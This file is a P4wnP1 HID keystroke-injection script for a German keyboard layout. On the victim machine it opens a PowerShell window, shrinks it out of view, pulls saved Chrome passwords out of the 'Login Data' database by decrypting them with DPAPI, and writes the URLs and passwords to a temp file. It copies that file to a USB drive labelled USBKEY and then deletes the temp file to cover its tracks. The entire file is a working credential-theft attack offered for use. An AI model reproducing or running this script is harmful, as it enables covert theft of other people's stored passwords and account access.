// Generated by P4wnP1 A.L.O.A Scripter by BeBoX
// contact on twitter @beboxos
// Get chrome credential and store it to c:\temp\temp.txt
// then check if USBKEY drive is present and copy to G: as compulternamechrome.txt
// then delete c:\temp\temp.txt and quit
layout('de')
typingSpeed(0,0)
press("GUI r")
delay(200)
type("powershell\n")
delay(1000)
type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName(')
press("3")
type ('WindowsBase')
press("3")
type (')).GetType(')
press("3")
type ('MS.Win32.UnsafeNativeMethods')
press("3")
type ('))::SetWindowPos($hw,$i,0,0,100,100,16512)\n')
type('function Get-ChromeCreds() {;Param([String]$Path	);if ([String]::IsNullOrEmpty($Path)) {$Path = ')
press("3")
type ('$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
press("3")
type (';}\n')
type('if (![system.io.file]::Exists($Path)){Write-host \'Chrome db file doesnt exist, or invalid file path specified.\';Break;}\n')
type('Add-Type -AssemblyName System.Security;$Stream = New-Object IO.FileStream -ArgumentList ')
press("3")
type ('$Path')
press("3")
type (', \'Open\', \'Read\', \'ReadWrite\';$Encoding = [system.Text.Encoding]::GetEncoding(28591)\n')
type('$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding;$BinaryText = $StreamReader.ReadToEnd();$StreamReader.Close();$Stream.Close()\n')
type('$PwdRegex = [Regex] \'(\\x01\\x00\\x00\\x00\\xD0\\x8C\\x9D\\xDF\\x01\\x15\\xD1\\x11\\x8C\\x7A\\x00\\xC0\\x4F\\xC2\\x97\\xEB\\x01\\x00\\x00\\x00)[\\s\\S]*?(?=\\x68\\x74\\x74\\x70')
press("RIGHT_ALT 6")
type ('\\Z)\'\n')
type('$PwdMatches = $PwdRegex.Matches($BinaryText);$PwdNum = 0;$DecPwdArray = ')
press("RIGHT_ALT 0")
type ('();$PwdMatchCount = $PwdMatches.Count\n')
type('Foreach ($Pwd in $PwdMatches) {$Pwd = $Encoding.GetBytes($PwdMatches[$PwdNum]);$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);$DecPwd = [System.Text.Encoding]::Default.GetString($Decrypt);$DecPwdArray += $DecPwd;$PwdNum += 1;}\n')
type('$UserRegex = [Regex] \'(?<=\\x0D\\x0D\\x0D[\\s\\S]{2}\\x68\\x74\\x74\\x70)[\\s\\S]*?(?=\\x01\\x00\\x00\\x00\\xD0\\x8C\\x9D\\xDF\\x01\\x15\\xD1\\x11\\x8C\\x7A\\x00\\xC0\\x4F\\xC2\\x97\\xEB\\x01\\x00\\x00\\x00)\'\n')
type('$UserMatches = $UserRegex.Matches($BinaryText);$UserNum = 0;$UserMatchCount = $UserMatches.Count;$UserArray = ')
press("RIGHT_ALT 0")
type ('()	\n')
type('if (-NOT ($UserMatchCount -eq $PwdMatchCount)) { Write-host ([string]')
press("3")
type ('The number of users is different than the number of passwords! This is most likely due to a regex mismatch.')
press("3")
type (')}	\n')
type('$HTTP = ')
press("3")
type ('http')
press("3")
type (';Foreach ($User in $UserMatches) {$User = $Encoding.GetBytes($UserMatches[$UserNum]);$User = $HTTPEnc + $User;$UserString = [System.Text.Encoding]::Default.GetString($User);$UserString = $HTTP + $UserString;$UserArray += $UserString;$UserNum += 1;}	\n')
type('$ArrayFinal = New-Object -TypeName System.Collections.ArrayList;for ($i = 0; $i -lt $UserNum; $i++) {;$ObjectProp = ')
press("RIGHT_ALT 0")
type ('{ \n')
type('UserURL = $UserArray[$i];Password = $DecPwdArray[$i];};$obj = New-Object PSObject -Property $ObjectProp;$ArrayFinal.Add($obj) ')
press("RIGHT_ALT 6")
type (' Out-Null;};$ArrayFinal;}\n')
type('\n')
type('rm c:\\temp\\temp.txt\n')
type('Get-ChromeCreds > c:\\temp\\temp.txt\n')
type('$p4wnp1 = [System.IO.DriveInfo]::getdrives() ')
press("RIGHT_ALT 6")
type ('where-object {$_.VolumeLabel -match ')
press("3")
type ('USBKEY')
press("3")
type ('}')
press("RIGHT_ALT 6")
type ('sort {$_.name} ')
press("RIGHT_ALT 6")
type ('foreach-object {; echo ')
press("3")
type ('$(echo $_.name)')
press("3")
type (';}\n')
type('cp c:\\temp\\temp.txt ($p4wnp1+$env:computername+')
press("3")
type ('chrome.txt')
press("3")
type (')\n')
type('rm c:\\temp\\temp.txt\n')
type('exit\n')
type('\n')